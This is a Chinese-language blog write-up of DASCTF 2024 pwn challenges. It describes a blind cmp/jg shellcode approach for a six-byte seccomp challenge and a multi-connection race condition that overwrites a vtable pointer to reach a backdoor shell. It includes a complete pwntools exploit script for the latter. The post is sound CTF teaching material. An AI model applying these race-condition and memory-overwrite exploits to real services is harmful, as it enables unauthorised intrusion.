---
title: DASCTF 2024-Pub 个人部分题解
published: true
---

| 目录跳转: |
|--------|
| [PWN题目: sixbytes - 暂不附Exp](#pwn题目-sixbytes) |
| [PWN题目: usersys - 附Exp](#pwn题目-usersys) |
| [PWN题目: ChromeLogger(未更完)](#pwn题目-chromelogger) |


# [](#header-3)pwn题目 sixbytes

进入 main 函数，调用函数读取 flag 而后赋值给 v4，v4 即为 flag 的字符串首地址，函数笔者不再赘述. 接下来进入 sub_5555555553B8 看 v3 的生成方式

![dasctf](/image/dasctf2024/1.png)  

sub_5555555553B8:   
可以观察到，该函数使用 mmap 在 0x20240000 申请了权限为 0x7 (可读可写可执行) 的较长空间后，再读取了 6 个字节的用户输入数据到该空间内. 这里限制了用户只能输入六个字节的数据

![dasctf](/image/dasctf2024/2.png)  

最后在主函数以 v4 为参数调用该空间. 即将 PC 更改到用户输入数据的头部

![dasctf](/image/dasctf2024/3.png)  

一开始我的思路是 _perror 直接输出 flag，看了一下后发现开启了 seccomp 禁止了 syscall

![dasctf](/image/dasctf2024/4.png)  

由于没任何输入输出，只能靠盲注：

如下所示，当 [rdi + i] 的值大于 X 时则跳转，进入到死循环，否则 Segment Error. 这样就可以写个二分盲注，盲注出结果

`payload`

```x64
loop:
cmp byte ptr[rdi + i], X
jg loop
```

而正巧的是，该 payload 占长度为 5 字节，不超过 6 字节. 因此是可行的

exp 后面再放

# [](#header-3)pwn题目 usersys

首先经过探查发现，这个题只有 guest 输入用户名称的地方能够输入任意字节的用户名称，并且添加.  
因此大概率确定是由此导致的内存覆写然后造成的危害  

首先查看 guest 处理函数 FUNC_GUEST(如下图所示，该函数实际上记录在虚表中)，笔者先解释一下几个关键函数及参数的用途：
1. 参数 a1 代表当前所有登记了的 guest 统计结构体，该结构体包括当前各个 guest 名称，总的 guest 数量(下文中笔者把 a1 中的总 guest 数量简称为 guest_count )，该结构体可以大致理解为如下数据结构
    ```c
    struct type_a1{
        char guest_name[5][8];      // a1 + 0x18, guest 字符串数组，最大只能写 5 个，每个 guest 名称长度最大 8
        long guest_count;           // a1 + 0x40, guest 长度
    };
    ```
2. 红圈中的 UPDATE_FILE 函数从保存的 GUEST_DATA 中读取登记了的 guest 名称数据并更新 a1，可以简单理解为 UPDATE_FILE 更新了 a1

![dasctf](/image/dasctf2024/5.png)  

ADMIN 表和 GUEST 表都是写在结构体上的虚表，是看情况调用的. 此处距离 a1 不远，推测该题应该是写入虚表 getshell. 简单内存图请看如下所示，详细内存分布情况请查看更下面的 `a1 部分内存分布情况` 表

![dasctf](/image/dasctf2024/6.png)  

观察虚表发现 Root 用户函数地址，这是一个后门函数，如果能够覆盖 Admin 的虚表为 Root 的虚表，就可以进入到该后门

![dasctf](/image/dasctf2024/7.png)  


红色横线中 `*(__int16 *)(a1 + 64) > 4` 取出 a1 中 guest_count 并判断当前 guest_count 是否大于 4，如果大于 4，也就是当前记录的 guest 总数大于等于 5 时则不做记录(在此的寄存器取址 细节逻辑请查看 汇编代码，笔者不再赘述)

![dasctf](/image/dasctf2024/5.png)  

但是可以发现，这里在经过 `*(__int16 *)(a1 + 64) > 4` 的逻辑判断后又 UPDATE_FILE 更新了 a1 一次. 可以确定在此肯定有条件竞争导致的漏洞，当多个线程同时访问该文件并进入了 else 语句 (`wanna leave your name?[y/n]`)但还未 UPDATE_FILE 时，由于多个线程条件竞争漏洞 在合适的条件下 guest_count 肯定是能够大于等于 5 的

在第二次 UPDATE_FILE 结束后，发现 read 函数读取用户输入
```c
read(0, (void *)(8 * (*(__int16 *)(a1 + 64) + 2LL) + a1 + 8), 8uLL);
```
其作用是将用户输入数据读入到 `(void *)(8 * (*(__int16 *)(a1 + 64) + 2LL) + a1 + 8)`，那么怎么理解该读入地址呢？根据上文分析可以知道 `*(__int16 *)(a1 + 64)` 代表 guest_count，那么这串代码简述过来就是 `8 * (guest_count + 2LL) + a1 + 8`，化简后就是 `a1 + 0x18 + guest_count * 8`，由于 guest_name 中一个字符串 8 字节，整个读入地址 可以简单理解为如下形式    
`guest_name[guest_count]`  
那么 read 就可以理解为  
```c
read(0, guest_name[guest_count], 8uLL);
```

在此我先将 a1 及其前后的部分内存分布情况简单列出: 

<br>
<table style="border:1px solid #2bbc8a;border-collapse: collapse;" border="1">
    <tr>
        <td colspan="2">a1 部分内存分布情况</td>
    </tr>
    <tr>
        <td>a1 + 0x18</td>
        <td>guest_name[0]：第一个 guest 名称</td>
    </tr>
    <tr>
        <td>a1 + 0x20</td>
        <td>guest_name[1]：第二个 guest 名称</td>
    </tr>
    <tr>
        <td>a1 + 0x28</td>
        <td>guest_name[2]：第三个 guest 名称</td>
    </tr>
    <tr>
        <td>a1 + 0x30</td>
        <td>guest_name[3]：第四个 guest 名称</td>
    </tr>
    <tr>
        <td>a1 + 0x38</td>
        <td>guest_name[4]：第五个 guest 名称</td>
    </tr>
    <tr>
        <td>a1 + 0x40</td>
        <td>guest_count</td>
    </tr>
    <tr>
        <td>...</td>
        <td>......</td>
    </tr>
    <tr>
        <td>a1 + 0x50</td>
        <td>Root 函数的虚表地址</td>
    </tr>
    <tr>
        <td>...</td>
        <td>......</td>
    </tr>
    <tr>
        <td>a1 + 0x70</td>
        <td>Admin 函数的虚表地址</td>
    </tr>
</table>

可以发现，Admin 函数虚表地址 隔 `guest_name[0]` 的距离恰巧为 0x58 个字节也就是 11 个 8 字节，`guest_name[11]` 访问到的即是 Admin 的虚表地址，那么 `guest_name[6]` 访问到的即是 guest_count

此时，可以利用条件竞争漏洞，连接两个线程至 `wanna leave your name?[y/n]` 处，当 第一个线程 写到第五个 时，第二个线程由于已经到 `wanna leave your name?[y/n]`  处，还可以继续写第六个也就是 `guest_name[6]`，那么第二个线程就可以随意更改 guest_count 的值. 

而笔者需要修改 Admin 函数的虚表地址为 Root 的虚表地址，因此需要第三个线程的介入. 

解题流程：  

在前面已经知道 第二个线程是用来修改 guest_count 的值，那么可以将 guest_count 拓展到笔者想要修改的地址(在此为 Admin 函数虚表位置). 然后拓展第三个线程修改该位置的值(在此将 原虚表的值，修改为 Root 虚表的值)

首先连接第一个线程，当第一个线程 写到第四个 guest 时并已经进入 `wanna leave your name?[y/n]` 但未输入 `y` 时，旋即连接第二 第三个线程并都进入到 `wanna leave your name?[y/n]` 等待. 然后第一个线程再写入一个 guest 达到写满

第二个线程由于已经到 `wanna leave your name?[y/n]`  处，还可以继续写第六个，而第六个 8 字节地址正巧就是 guest_count 的值，那么第二个线程就可以写入 0xa，当该进程写入结束后 guest_count 就会变成 0xb. 

然后第三个线程此时写入的就是 `guest_name[11]`，即 Admin 虚表地址了. 只要此时写入 Root 地址的固定的最低一个字节 0x50 即可(其高地址将会 RELRO，因此只写入最后一个字节)

exp 如下所示
```py
# by leeya_bug
IP      = {你的 IP}
PORT    = {你的端口}

from pwn import * 
import time

c1 = remote(IP, PORT)

# 清空原有数据
time.sleep(0.3)
c1.sendline(b'admin')
c1.sendline(b'clear')
c1.sendline(b'logout')

# 填充四个 guest
for i in range(1, 5):
    time.sleep(0.3)
    c1.sendline(b'guest')
    c1.sendline(b'y')
    c1.sendline(b'name' + str(i).encode())

# 启动另外两个 Connection，并让三个 Connection 进入 wanna leave your name?[y/n] 等待区
if True:
    time.sleep(0.3)
    c1.sendline(b'guest')

    c2 = remote(IP, PORT)
    time.sleep(0.3)
    c2.sendline(b'guest')
    
    c3 = remote(IP, PORT)
    time.sleep(0.3)
    c3.sendline(b'guest')

# 第一个 Connection 填充第五个 guest
time.sleep(0.3)    
c1.sendline(b'y')
c1.sendline(b'name5')

# 第二个 Connection 修改 guest_count 为 0xa，后面变成 0xb
time.sleep(0.3)
c2.sendline(b'y')
c2.sendline(p64(0xa))

# 第三个 Connection 修改 Admin 虚表的最后一个字节为 50，即 Root 虚表的地址
time.sleep(0.3)
c3.sendline(b'y')
c3.send('\x50')

# 触发 admin，反弹 shell
time.sleep(0.3)
c3.sendline(b'admin')
c3.interactive()
```

运行以上 exp，连接 Shell 后，输入 `cat /flag` 命令即可获取 flag

![dasctf](/image/dasctf2024/8.png)  

# [](#header-3)pwn题目 chromelogger

由于笔者这两天事很多，没有更新完，后面再更新
